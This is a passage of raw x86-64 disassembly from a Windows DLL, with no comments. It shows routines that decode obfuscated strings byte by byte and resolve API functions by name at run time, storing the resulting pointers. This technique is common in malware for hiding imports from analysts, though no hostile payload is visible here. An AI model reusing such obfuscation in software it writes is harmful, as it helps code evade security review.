   180001eb3:	48 89 44 24 2d       	mov    %rax,0x2d(%rsp)
   180001eb8:	89 44 24 35          	mov    %eax,0x35(%rsp)
   180001ebc:	88 44 24 39          	mov    %al,0x39(%rsp)
   180001ec0:	66 0f 7e c8          	movd   %xmm1,%eax
   180001ec4:	88 44 24 20          	mov    %al,0x20(%rsp)
   180001ec8:	66 0f 7e c0          	movd   %xmm0,%eax
   180001ecc:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001ed0:	66 0f 73 d8 02       	psrldq $0x2,%xmm0
   180001ed5:	88 44 24 21          	mov    %al,0x21(%rsp)
   180001ed9:	66 0f 7e c0          	movd   %xmm0,%eax
   180001edd:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001ee1:	66 0f 73 d8 03       	psrldq $0x3,%xmm0
   180001ee6:	88 44 24 22          	mov    %al,0x22(%rsp)
   180001eea:	66 0f 7e c0          	movd   %xmm0,%eax
   180001eee:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001ef2:	66 0f 73 d8 04       	psrldq $0x4,%xmm0
   180001ef7:	88 44 24 23          	mov    %al,0x23(%rsp)
   180001efb:	66 0f 7e c0          	movd   %xmm0,%eax
   180001eff:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001f03:	66 0f 73 d8 05       	psrldq $0x5,%xmm0
   180001f08:	88 44 24 24          	mov    %al,0x24(%rsp)
   180001f0c:	66 0f 7e c0          	movd   %xmm0,%eax
   180001f10:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001f14:	66 0f 73 d8 06       	psrldq $0x6,%xmm0
   180001f19:	88 44 24 25          	mov    %al,0x25(%rsp)
   180001f1d:	66 0f 7e c0          	movd   %xmm0,%eax
   180001f21:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001f25:	66 0f 73 d8 07       	psrldq $0x7,%xmm0
   180001f2a:	88 44 24 26          	mov    %al,0x26(%rsp)
   180001f2e:	66 0f 7e c0          	movd   %xmm0,%eax
   180001f32:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001f36:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   180001f3b:	88 44 24 27          	mov    %al,0x27(%rsp)
   180001f3f:	66 0f 7e c0          	movd   %xmm0,%eax
   180001f43:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001f47:	66 0f 73 d8 09       	psrldq $0x9,%xmm0
   180001f4c:	88 44 24 28          	mov    %al,0x28(%rsp)
   180001f50:	66 0f 7e c0          	movd   %xmm0,%eax
   180001f54:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001f58:	66 0f 73 d8 0a       	psrldq $0xa,%xmm0
   180001f5d:	88 44 24 29          	mov    %al,0x29(%rsp)
   180001f61:	66 0f 7e c0          	movd   %xmm0,%eax
   180001f65:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001f69:	66 0f 73 d8 0b       	psrldq $0xb,%xmm0
   180001f6e:	66 0f 73 d9 0c       	psrldq $0xc,%xmm1
   180001f73:	88 44 24 2a          	mov    %al,0x2a(%rsp)
   180001f77:	66 0f 7e c0          	movd   %xmm0,%eax
   180001f7b:	88 44 24 2b          	mov    %al,0x2b(%rsp)
   180001f7f:	66 0f 7e c8          	movd   %xmm1,%eax
   180001f83:	88 44 24 2c          	mov    %al,0x2c(%rsp)
   180001f87:	e8 84 c3 00 00       	call   0x18000e310
   180001f8c:	48 8b d0             	mov    %rax,%rdx
   180001f8f:	48 8b cf             	mov    %rdi,%rcx
   180001f92:	ff 15 98 41 02 00    	call   *0x24198(%rip)        # 0x180026130
   180001f98:	48 89 05 69 8d 3a 00 	mov    %rax,0x3a8d69(%rip)        # 0x1803aad08
   180001f9f:	48 85 c0             	test   %rax,%rax
   180001fa2:	0f 84 47 02 00 00    	je     0x1800021ef
   180001fa8:	66 0f 6f 0d d0 2d 3a 	movdqa 0x3a2dd0(%rip),%xmm1        # 0x1803a4d80
   180001faf:	00 
   180001fb0:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   180001fb4:	33 c0                	xor    %eax,%eax
   180001fb6:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001fba:	66 0f 73 d8 01       	psrldq $0x1,%xmm0
   180001fbf:	0f ba eb 10          	bts    $0x10,%ebx
   180001fc3:	48 89 45 af          	mov    %rax,-0x51(%rbp)
   180001fc7:	89 45 b7             	mov    %eax,-0x49(%rbp)
   180001fca:	66 89 45 bb          	mov    %ax,-0x45(%rbp)
   180001fce:	88 45 bd             	mov    %al,-0x43(%rbp)
   180001fd1:	66 0f 7e c8          	movd   %xmm1,%eax
   180001fd5:	88 45 a0             	mov    %al,-0x60(%rbp)
   180001fd8:	66 0f 7e c0          	movd   %xmm0,%eax
   180001fdc:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001fe0:	66 0f 73 d8 02       	psrldq $0x2,%xmm0
   180001fe5:	88 45 a1             	mov    %al,-0x5f(%rbp)
   180001fe8:	66 0f 7e c0          	movd   %xmm0,%eax
   180001fec:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001ff0:	66 0f 73 d8 03       	psrldq $0x3,%xmm0
   180001ff5:	88 45 a2             	mov    %al,-0x5e(%rbp)
   180001ff8:	66 0f 7e c0          	movd   %xmm0,%eax
   180001ffc:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002000:	66 0f 73 d8 04       	psrldq $0x4,%xmm0
   180002005:	88 45 a3             	mov    %al,-0x5d(%rbp)
   180002008:	66 0f 7e c0          	movd   %xmm0,%eax
   18000200c:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002010:	66 0f 73 d8 05       	psrldq $0x5,%xmm0
   180002015:	88 45 a4             	mov    %al,-0x5c(%rbp)
   180002018:	66 0f 7e c0          	movd   %xmm0,%eax
   18000201c:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002020:	66 0f 73 d8 06       	psrldq $0x6,%xmm0
   180002025:	88 45 a5             	mov    %al,-0x5b(%rbp)
   180002028:	66 0f 7e c0          	movd   %xmm0,%eax
   18000202c:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002030:	66 0f 73 d8 07       	psrldq $0x7,%xmm0
   180002035:	88 45 a6             	mov    %al,-0x5a(%rbp)
   180002038:	66 0f 7e c0          	movd   %xmm0,%eax
   18000203c:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002040:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   180002045:	88 45 a7             	mov    %al,-0x59(%rbp)
   180002048:	66 0f 7e c0          	movd   %xmm0,%eax
   18000204c:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002050:	66 0f 73 d8 09       	psrldq $0x9,%xmm0
   180002055:	88 45 a8             	mov    %al,-0x58(%rbp)
   180002058:	66 0f 7e c0          	movd   %xmm0,%eax
   18000205c:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002060:	66 0f 73 d8 0a       	psrldq $0xa,%xmm0
   180002065:	88 45 a9             	mov    %al,-0x57(%rbp)
   180002068:	66 0f 7e c0          	movd   %xmm0,%eax
   18000206c:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002070:	66 0f 73 d8 0b       	psrldq $0xb,%xmm0
   180002075:	88 45 aa             	mov    %al,-0x56(%rbp)
   180002078:	66 0f 7e c0          	movd   %xmm0,%eax
   18000207c:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002080:	66 0f 73 d8 0c       	psrldq $0xc,%xmm0
   180002085:	88 45 ab             	mov    %al,-0x55(%rbp)
   180002088:	66 0f 7e c0          	movd   %xmm0,%eax
   18000208c:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002090:	66 0f 73 d8 0d       	psrldq $0xd,%xmm0
   180002095:	66 0f 73 d9 0e       	psrldq $0xe,%xmm1
   18000209a:	88 45 ac             	mov    %al,-0x54(%rbp)
   18000209d:	66 0f 7e c0          	movd   %xmm0,%eax
   1800020a1:	88 45 ad             	mov    %al,-0x53(%rbp)
   1800020a4:	66 0f 7e c8          	movd   %xmm1,%eax
   1800020a8:	88 45 ae             	mov    %al,-0x52(%rbp)
   1800020ab:	e8 c0 c3 00 00       	call   0x18000e470
   1800020b0:	48 8b d0             	mov    %rax,%rdx
   1800020b3:	48 8b cf             	mov    %rdi,%rcx
   1800020b6:	ff 15 74 40 02 00    	call   *0x24074(%rip)        # 0x180026130
   1800020bc:	48 89 05 05 8c 3a 00 	mov    %rax,0x3a8c05(%rip)        # 0x1803aacc8
   1800020c3:	48 85 c0             	test   %rax,%rax
   1800020c6:	0f 84 23 01 00 00    	je     0x1800021ef
   1800020cc:	66 0f 6f 0d fc 2b 3a 	movdqa 0x3a2bfc(%rip),%xmm1        # 0x1803a4cd0
   1800020d3:	00 
   1800020d4:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1800020d9:	33 c0                	xor    %eax,%eax
   1800020db:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800020df:	66 0f 73 d8 01       	psrldq $0x1,%xmm0
   1800020e4:	0f ba eb 11          	bts    $0x11,%ebx
   1800020e8:	48 89 44 24 6e       	mov    %rax,0x6e(%rsp)
   1800020ed:	89 44 24 76          	mov    %eax,0x76(%rsp)
   1800020f1:	66 89 44 24 7a       	mov    %ax,0x7a(%rsp)
   1800020f6:	66 0f 7e c8          	movd   %xmm1,%eax
   1800020fa:	88 44 24 60          	mov    %al,0x60(%rsp)
   1800020fe:	66 0f 7e c0          	movd   %xmm0,%eax
   180002102:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002106:	66 0f 73 d8 02       	psrldq $0x2,%xmm0
   18000210b:	88 44 24 61          	mov    %al,0x61(%rsp)
   18000210f:	66 0f 7e c0          	movd   %xmm0,%eax
   180002113:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002117:	66 0f 73 d8 03       	psrldq $0x3,%xmm0
   18000211c:	88 44 24 62          	mov    %al,0x62(%rsp)
   180002120:	66 0f 7e c0          	movd   %xmm0,%eax
   180002124:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002128:	66 0f 73 d8 04       	psrldq $0x4,%xmm0
   18000212d:	88 44 24 63          	mov    %al,0x63(%rsp)
   180002131:	66 0f 7e c0          	movd   %xmm0,%eax
   180002135:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002139:	66 0f 73 d8 05       	psrldq $0x5,%xmm0
   18000213e:	88 44 24 64          	mov    %al,0x64(%rsp)
   180002142:	66 0f 7e c0          	movd   %xmm0,%eax
   180002146:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000214a:	66 0f 73 d8 06       	psrldq $0x6,%xmm0
   18000214f:	88 44 24 65          	mov    %al,0x65(%rsp)
   180002153:	66 0f 7e c0          	movd   %xmm0,%eax
   180002157:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000215b:	66 0f 73 d8 07       	psrldq $0x7,%xmm0
   180002160:	88 44 24 66          	mov    %al,0x66(%rsp)
   180002164:	66 0f 7e c0          	movd   %xmm0,%eax
   180002168:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000216c:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   180002171:	88 44 24 67          	mov    %al,0x67(%rsp)
   180002175:	66 0f 7e c0          	movd   %xmm0,%eax
   180002179:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000217d:	66 0f 73 d8 09       	psrldq $0x9,%xmm0
   180002182:	88 44 24 68          	mov    %al,0x68(%rsp)
   180002186:	66 0f 7e c0          	movd   %xmm0,%eax
   18000218a:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000218e:	66 0f 73 d8 0a       	psrldq $0xa,%xmm0
   180002193:	88 44 24 69          	mov    %al,0x69(%rsp)
   180002197:	66 0f 7e c0          	movd   %xmm0,%eax
   18000219b:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000219f:	66 0f 73 d8 0b       	psrldq $0xb,%xmm0
   1800021a4:	88 44 24 6a          	mov    %al,0x6a(%rsp)
   1800021a8:	66 0f 7e c0          	movd   %xmm0,%eax
   1800021ac:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800021b0:	66 0f 73 d8 0c       	psrldq $0xc,%xmm0
   1800021b5:	66 0f 73 d9 0d       	psrldq $0xd,%xmm1
   1800021ba:	88 44 24 6b          	mov    %al,0x6b(%rsp)
   1800021be:	66 0f 7e c0          	movd   %xmm0,%eax
   1800021c2:	88 44 24 6c          	mov    %al,0x6c(%rsp)
   1800021c6:	66 0f 7e c8          	movd   %xmm1,%eax
   1800021ca:	88 44 24 6d          	mov    %al,0x6d(%rsp)
   1800021ce:	e8 ed c3 00 00       	call   0x18000e5c0
   1800021d3:	48 8b d0             	mov    %rax,%rdx
   1800021d6:	48 8b cf             	mov    %rdi,%rcx
   1800021d9:	ff 15 51 3f 02 00    	call   *0x23f51(%rip)        # 0x180026130
   1800021df:	48 89 05 1a 8b 3a 00 	mov    %rax,0x3a8b1a(%rip)        # 0x1803aad00
   1800021e6:	48 85 c0             	test   %rax,%rax
   1800021e9:	74 04                	je     0x1800021ef
   1800021eb:	32 c9                	xor    %cl,%cl
   1800021ed:	eb 02                	jmp    0x1800021f1
   1800021ef:	b1 01                	mov    $0x1,%cl
   1800021f1:	0f ba e3 11          	bt     $0x11,%ebx
   1800021f5:	73 17                	jae    0x18000220e
   1800021f7:	0f ba f3 11          	btr    $0x11,%ebx
   1800021fb:	48 8b c6             	mov    %rsi,%rax
   1800021fe:	66 90                	xchg   %ax,%ax
   180002200:	40 88 74 04 6e       	mov    %sil,0x6e(%rsp,%rax,1)
   180002205:	48 ff c0             	inc    %rax
   180002208:	48 83 f8 0e          	cmp    $0xe,%rax
   18000220c:	72 f2                	jb     0x180002200
   18000220e:	0f ba e3 10          	bt     $0x10,%ebx
   180002212:	73 1a                	jae    0x18000222e
   180002214:	0f ba f3 10          	btr    $0x10,%ebx
   180002218:	48 8b c6             	mov    %rsi,%rax
   18000221b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002220:	40 88 74 05 af       	mov    %sil,-0x51(%rbp,%rax,1)
   180002225:	48 ff c0             	inc    %rax
   180002228:	48 83 f8 0f          	cmp    $0xf,%rax
   18000222c:	72 f2                	jb     0x180002220
   18000222e:	0f ba e3 0f          	bt     $0xf,%ebx
   180002232:	73 1a                	jae    0x18000224e
   180002234:	0f ba f3 0f          	btr    $0xf,%ebx
   180002238:	48 8b c6             	mov    %rsi,%rax
   18000223b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002240:	40 88 74 04 2d       	mov    %sil,0x2d(%rsp,%rax,1)
   180002245:	48 ff c0             	inc    %rax
   180002248:	48 83 f8 0d          	cmp    $0xd,%rax
   18000224c:	72 f2                	jb     0x180002240
   18000224e:	0f ba e3 0e          	bt     $0xe,%ebx
   180002252:	73 1a                	jae    0x18000226e
   180002254:	0f ba f3 0e          	btr    $0xe,%ebx
   180002258:	48 8b c6             	mov    %rsi,%rax
   18000225b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002260:	40 88 74 05 8c       	mov    %sil,-0x74(%rbp,%rax,1)
   180002265:	48 ff c0             	inc    %rax
   180002268:	48 83 f8 0c          	cmp    $0xc,%rax
   18000226c:	72 f2                	jb     0x180002260
   18000226e:	0f ba e3 0d          	bt     $0xd,%ebx
   180002272:	73 1a                	jae    0x18000228e
   180002274:	0f ba f3 0d          	btr    $0xd,%ebx
   180002278:	48 8b c6             	mov    %rsi,%rax
   18000227b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002280:	40 88 74 05 d4       	mov    %sil,-0x2c(%rbp,%rax,1)
   180002285:	48 ff c0             	inc    %rax
   180002288:	48 83 f8 14          	cmp    $0x14,%rax
   18000228c:	72 f2                	jb     0x180002280
   18000228e:	0f ba e3 0c          	bt     $0xc,%ebx
   180002292:	73 1d                	jae    0x1800022b1
   180002294:	0f ba f3 0c          	btr    $0xc,%ebx
   180002298:	48 8b c6             	mov    %rsi,%rax
   18000229b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800022a0:	40 88 b4 05 a9 00 00 	mov    %sil,0xa9(%rbp,%rax,1)
   1800022a7:	00 
   1800022a8:	48 ff c0             	inc    %rax
   1800022ab:	48 83 f8 11          	cmp    $0x11,%rax
   1800022af:	72 ef                	jb     0x1800022a0
   1800022b1:	0f ba e3 0b          	bt     $0xb,%ebx
   1800022b5:	73 1a                	jae    0x1800022d1
   1800022b7:	0f ba f3 0b          	btr    $0xb,%ebx
   1800022bb:	48 8b c6             	mov    %rsi,%rax
   1800022be:	66 90                	xchg   %ax,%ax
   1800022c0:	40 88 b4 05 0e 01 00 	mov    %sil,0x10e(%rbp,%rax,1)
   1800022c7:	00 
   1800022c8:	48 ff c0             	inc    %rax
   1800022cb:	48 83 f8 16          	cmp    $0x16,%rax
   1800022cf:	72 ef                	jb     0x1800022c0
   1800022d1:	0f ba e3 0a          	bt     $0xa,%ebx
   1800022d5:	73 17                	jae    0x1800022ee
   1800022d7:	0f ba f3 0a          	btr    $0xa,%ebx
   1800022db:	48 8b c6             	mov    %rsi,%rax
   1800022de:	66 90                	xchg   %ax,%ax
   1800022e0:	40 88 74 05 2c       	mov    %sil,0x2c(%rbp,%rax,1)
   1800022e5:	48 ff c0             	inc    %rax
   1800022e8:	48 83 f8 14          	cmp    $0x14,%rax
   1800022ec:	72 f2                	jb     0x1800022e0
   1800022ee:	0f ba e3 09          	bt     $0x9,%ebx
   1800022f2:	73 1a                	jae    0x18000230e
   1800022f4:	0f ba f3 09          	btr    $0x9,%ebx
   1800022f8:	48 8b c6             	mov    %rsi,%rax
   1800022fb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002300:	40 88 74 05 56       	mov    %sil,0x56(%rbp,%rax,1)
   180002305:	48 ff c0             	inc    %rax
   180002308:	48 83 f8 16          	cmp    $0x16,%rax
   18000230c:	72 f2                	jb     0x180002300
   18000230e:	0f ba f3 08          	btr    $0x8,%ebx
   180002312:	48 8b c6             	mov    %rsi,%rax
   180002315:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   18000231c:	00 00 00 00 
   180002320:	40 88 74 05 00       	mov    %sil,0x0(%rbp,%rax,1)
   180002325:	48 ff c0             	inc    %rax
   180002328:	48 83 f8 10          	cmp    $0x10,%rax
   18000232c:	72 f2                	jb     0x180002320
   18000232e:	84 c9                	test   %cl,%cl
   180002330:	0f 85 3c 0f 00 00    	jne    0x180003272
   180002336:	33 c0                	xor    %eax,%eax
   180002338:	c7 45 c0 48 00 41 00 	movl   $0x410048,-0x40(%rbp)
   18000233f:	0f 57 c0             	xorps  %xmm0,%xmm0
   180002342:	89 45 da             	mov    %eax,-0x26(%rbp)
   180002345:	0f 11 85 da 00 00 00 	movups %xmm0,0xda(%rbp)
   18000234c:	66 89 45 de          	mov    %ax,-0x22(%rbp)
   180002350:	48 8d 8d c0 00 00 00 	lea    0xc0(%rbp),%rcx
   180002357:	48 89 85 ea 00 00 00 	mov    %rax,0xea(%rbp)
   18000235e:	66 89 85 f2 00 00 00 	mov    %ax,0xf2(%rbp)
   180002365:	b8 2f 00 00 00       	mov    $0x2f,%eax
   18000236a:	c7 45 c4 57 00 48 00 	movl   $0x480057,-0x3c(%rbp)
   180002371:	c7 45 c8 42 00 44 00 	movl   $0x440042,-0x38(%rbp)
   180002378:	c7 45 cc 1a 00 18 00 	movl   $0x18001a,-0x34(%rbp)
   18000237f:	0f 10 45 c0          	movups -0x40(%rbp),%xmm0
   180002383:	c7 45 d0 05 00 48 00 	movl   $0x480005,-0x30(%rbp)
   18000238a:	c7 45 d4 41 00 42 00 	movl   $0x420041,-0x2c(%rbp)
   180002391:	f2 0f 10 4d d0       	movsd  -0x30(%rbp),%xmm1
   180002396:	0f 11 85 c0 00 00 00 	movups %xmm0,0xc0(%rbp)
   18000239d:	66 89 85 d8 00 00 00 	mov    %ax,0xd8(%rbp)
   1800023a4:	f2 0f 11 8d d0 00 00 	movsd  %xmm1,0xd0(%rbp)
   1800023ab:	00 
   1800023ac:	e8 6f c0 00 00       	call   0x18000e420
   1800023b1:	48 8b c8             	mov    %rax,%rcx
   1800023b4:	ff 15 9e 3d 02 00    	call   *0x23d9e(%rip)        # 0x180026158
   1800023ba:	41 bc 1a 00 00 00    	mov    $0x1a,%r12d
   1800023c0:	48 8d bd da 00 00 00 	lea    0xda(%rbp),%rdi
   1800023c7:	4c 8b f0             	mov    %rax,%r14
   1800023ca:	41 8b cc             	mov    %r12d,%ecx
   1800023cd:	33 c0                	xor    %eax,%eax
   1800023cf:	f3 aa                	rep stos %al,(%rdi)
   1800023d1:	4d 85 f6             	test   %r14,%r14
   1800023d4:	0f 84 9e 0e 00 00    	je     0x180003278
   1800023da:	66 0f 6f 15 ee 26 3a 	movdqa 0x3a26ee(%rip),%xmm2        # 0x1803a4ad0
   1800023e1:	00 
   1800023e2:	48 8d 4d 40          	lea    0x40(%rbp),%rcx
   1800023e6:	66 0f 6f 0d 52 29 3a 	movdqa 0x3a2952(%rip),%xmm1        # 0x1803a4d40
   1800023ed:	00 
   1800023ee:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800023f1:	f2 0f 11 55 50       	movsd  %xmm2,0x50(%rbp)
   1800023f6:	0f ba eb 12          	bts    $0x12,%ebx
   1800023fa:	48 89 45 69          	mov    %rax,0x69(%rbp)
   1800023fe:	88 45 71             	mov    %al,0x71(%rbp)
   180002401:	66 0f 73 da 08       	psrldq $0x8,%xmm2
   180002406:	66 0f 7e d0          	movd   %xmm2,%eax
   18000240a:	0f 11 45 59          	movups %xmm0,0x59(%rbp)
   18000240e:	88 45 58             	mov    %al,0x58(%rbp)
   180002411:	0f 11 4d 40          	movups %xmm1,0x40(%rbp)
   180002415:	e8 c6 be 00 00       	call   0x18000e2e0
   18000241a:	48 8b d0             	mov    %rax,%rdx
   18000241d:	49 8b ce             	mov    %r14,%rcx
   180002420:	ff 15 0a 3d 02 00    	call   *0x23d0a(%rip)        # 0x180026130
   180002426:	48 89 05 23 88 3a 00 	mov    %rax,0x3a8823(%rip)        # 0x1803aac50
   18000242d:	48 85 c0             	test   %rax,%rax
   180002430:	0f 84 50 08 00 00    	je     0x180002c86
   180002436:	66 0f 6f 0d 42 2a 3a 	movdqa 0x3a2a42(%rip),%xmm1        # 0x1803a4e80
   18000243d:	00 
   18000243e:	48 8d 4d 78          	lea    0x78(%rbp),%rcx
   180002442:	0f 57 c0             	xorps  %xmm0,%xmm0
   180002445:	0f ba eb 13          	bts    $0x13,%ebx
   180002449:	0f 11 85 88 00 00 00 	movups %xmm0,0x88(%rbp)
   180002450:	0f 11 4d 78          	movups %xmm1,0x78(%rbp)
   180002454:	e8 77 bf 00 00       	call   0x18000e3d0
   180002459:	48 8b d0             	mov    %rax,%rdx
   18000245c:	49 8b ce             	mov    %r14,%rcx
   18000245f:	ff 15 cb 3c 02 00    	call   *0x23ccb(%rip)        # 0x180026130
   180002465:	48 89 05 3c 88 3a 00 	mov    %rax,0x3a883c(%rip)        # 0x1803aaca8
   18000246c:	48 85 c0             	test   %rax,%rax
   18000246f:	0f 84 11 08 00 00    	je     0x180002c86
   180002475:	66 0f 6f 0d 23 29 3a 	movdqa 0x3a2923(%rip),%xmm1        # 0x1803a4da0
   18000247c:	00 
   18000247d:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   180002482:	33 c0                	xor    %eax,%eax
   180002484:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002488:	66 0f 73 d8 01       	psrldq $0x1,%xmm0
   18000248d:	0f ba eb 14          	bts    $0x14,%ebx
   180002491:	48 89 44 24 4f       	mov    %rax,0x4f(%rsp)
   180002496:	89 44 24 57          	mov    %eax,0x57(%rsp)
   18000249a:	66 89 44 24 5b       	mov    %ax,0x5b(%rsp)
   18000249f:	88 44 24 5d          	mov    %al,0x5d(%rsp)
   1800024a3:	66 0f 7e c8          	movd   %xmm1,%eax
   1800024a7:	88 44 24 40          	mov    %al,0x40(%rsp)
   1800024ab:	66 0f 7e c0          	movd   %xmm0,%eax
   1800024af:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800024b3:	66 0f 73 d8 02       	psrldq $0x2,%xmm0
   1800024b8:	88 44 24 41          	mov    %al,0x41(%rsp)
   1800024bc:	66 0f 7e c0          	movd   %xmm0,%eax
   1800024c0:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800024c4:	66 0f 73 d8 03       	psrldq $0x3,%xmm0
   1800024c9:	88 44 24 42          	mov    %al,0x42(%rsp)
   1800024cd:	66 0f 7e c0          	movd   %xmm0,%eax
   1800024d1:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800024d5:	66 0f 73 d8 04       	psrldq $0x4,%xmm0
   1800024da:	88 44 24 43          	mov    %al,0x43(%rsp)
   1800024de:	66 0f 7e c0          	movd   %xmm0,%eax
   1800024e2:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800024e6:	66 0f 73 d8 05       	psrldq $0x5,%xmm0
   1800024eb:	88 44 24 44          	mov    %al,0x44(%rsp)
   1800024ef:	66 0f 7e c0          	movd   %xmm0,%eax
   1800024f3:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800024f7:	66 0f 73 d8 06       	psrldq $0x6,%xmm0
   1800024fc:	88 44 24 45          	mov    %al,0x45(%rsp)
   180002500:	66 0f 7e c0          	movd   %xmm0,%eax
   180002504:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002508:	66 0f 73 d8 07       	psrldq $0x7,%xmm0
   18000250d:	88 44 24 46          	mov    %al,0x46(%rsp)
   180002511:	66 0f 7e c0          	movd   %xmm0,%eax
   180002515:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002519:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   18000251e:	88 44 24 47          	mov    %al,0x47(%rsp)
   180002522:	66 0f 7e c0          	movd   %xmm0,%eax
   180002526:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000252a:	66 0f 73 d8 09       	psrldq $0x9,%xmm0
   18000252f:	88 44 24 48          	mov    %al,0x48(%rsp)
   180002533:	66 0f 7e c0          	movd   %xmm0,%eax
   180002537:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000253b:	66 0f 73 d8 0a       	psrldq $0xa,%xmm0
   180002540:	88 44 24 49          	mov    %al,0x49(%rsp)
   180002544:	66 0f 7e c0          	movd   %xmm0,%eax
   180002548:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000254c:	66 0f 73 d8 0b       	psrldq $0xb,%xmm0
   180002551:	88 44 24 4a          	mov    %al,0x4a(%rsp)
   180002555:	66 0f 7e c0          	movd   %xmm0,%eax
   180002559:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000255d:	66 0f 73 d8 0c       	psrldq $0xc,%xmm0
   180002562:	88 44 24 4b          	mov    %al,0x4b(%rsp)
   180002566:	66 0f 7e c0          	movd   %xmm0,%eax
   18000256a:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000256e:	66 0f 73 d8 0d       	psrldq $0xd,%xmm0
   180002573:	66 0f 73 d9 0e       	psrldq $0xe,%xmm1
   180002578:	88 44 24 4c          	mov    %al,0x4c(%rsp)
   18000257c:	66 0f 7e c0          	movd   %xmm0,%eax
   180002580:	88 44 24 4d          	mov    %al,0x4d(%rsp)
   180002584:	66 0f 7e c8          	movd   %xmm1,%eax
   180002588:	88 44 24 4e          	mov    %al,0x4e(%rsp)
   18000258c:	e8 df be 00 00       	call   0x18000e470
   180002591:	48 8b d0             	mov    %rax,%rdx
   180002594:	49 8b ce             	mov    %r14,%rcx
   180002597:	ff 15 93 3b 02 00    	call   *0x23b93(%rip)        # 0x180026130
   18000259d:	48 89 05 bc 86 3a 00 	mov    %rax,0x3a86bc(%rip)        # 0x1803aac60
   1800025a4:	48 85 c0             	test   %rax,%rax
   1800025a7:	0f 84 d9 06 00 00    	je     0x180002c86
   1800025ad:	66 0f 6f 0d 0b 28 3a 	movdqa 0x3a280b(%rip),%xmm1        # 0x1803a4dc0
   1800025b4:	00 
   1800025b5:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   1800025b9:	33 c0                	xor    %eax,%eax
   1800025bb:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800025bf:	66 0f 73 d8 01       	psrldq $0x1,%xmm0
   1800025c4:	0f ba eb 15          	bts    $0x15,%ebx
   1800025c8:	48 89 45 af          	mov    %rax,-0x51(%rbp)
   1800025cc:	89 45 b7             	mov    %eax,-0x49(%rbp)
   1800025cf:	66 89 45 bb          	mov    %ax,-0x45(%rbp)
   1800025d3:	88 45 bd             	mov    %al,-0x43(%rbp)
   1800025d6:	66 0f 7e c8          	movd   %xmm1,%eax
   1800025da:	88 45 a0             	mov    %al,-0x60(%rbp)
   1800025dd:	66 0f 7e c0          	movd   %xmm0,%eax
   1800025e1:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800025e5:	66 0f 73 d8 02       	psrldq $0x2,%xmm0
   1800025ea:	88 45 a1             	mov    %al,-0x5f(%rbp)
   1800025ed:	66 0f 7e c0          	movd   %xmm0,%eax
   1800025f1:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800025f5:	66 0f 73 d8 03       	psrldq $0x3,%xmm0
   1800025fa:	88 45 a2             	mov    %al,-0x5e(%rbp)
   1800025fd:	66 0f 7e c0          	movd   %xmm0,%eax
   180002601:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002605:	66 0f 73 d8 04       	psrldq $0x4,%xmm0
   18000260a:	88 45 a3             	mov    %al,-0x5d(%rbp)
